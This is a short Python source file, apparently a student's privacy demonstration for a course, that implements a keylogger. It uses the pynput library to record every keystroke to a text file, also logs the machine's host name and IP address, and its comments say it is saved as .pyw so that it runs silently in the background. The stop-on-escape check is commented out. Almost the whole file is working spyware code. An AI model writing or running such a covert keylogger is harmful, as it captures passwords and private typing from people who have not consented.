# This is a keylogger built with Python.
# I used a python plugin called pynput-master in order
# to track user input.
# The input is logged to a text file.
# Moreover, I also log the user's host name and ip address
# when the script is run.
# The purpose was to test to see how easy it can be to create
# a piece of software that is potentially dangerous in invading
# privacy, since privacy is a big topic in Computers and Society
# The file format of this is .pyw. The .pyw extension allows for 
# the python program to run silently in the background.

# library
from pynput.keyboard import Key, Listener
# vanilla
import logging
# import socket so I can get host name and ip address
import socket

# if no name for directory, it gets put into an empty string
 #make a log file
log_dir = ""
# variables to store IP address and host name if not available
host_name = "N/A"
host_ip = "N/A"

# this is a function from the 
# sets file to log to with file name and path
# sets debugging level to logging
# formats messages and keylogs in ascending time order
logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format = '%(asctime)s: %(message)s:')

# Function to display hostname and 
# IP address 
def get_Host_name_IP(): 
    try: 
        host_name = socket.gethostname() 
        host_ip = socket.gethostbyname(host_name) 
        print("Hostname:", host_name) 
        print("IP:", host_ip) 
        with open(log_dir + "key_log.txt", "a") as myfile:
            myfile.write("HOST NAME: " + host_name + "\n")
            myfile.write("IP ADDRESS: " + host_ip + "\n")
    except: 
        print("Unable to get Hostname and IP") 
        with open(log_dir + "key_log.txt", "a") as myfile:
            myfile.write("HOST NAME: " + host_name + "\n")
            myfile.write("IP ADDRESS: " + host_ip + "\n")
  
# Driver code 
get_Host_name_IP() # Function call 

# this is from the library
def on_press(key):
    logging.info(str(key))
    # logging can end if the escape key is pushed
    # if key == Key.esc:
        #return false

# the listener is listening to the keyboard on press as a listener
# this says the listener is on
with Listener(on_press=on_press) as listener:
    listener.join()
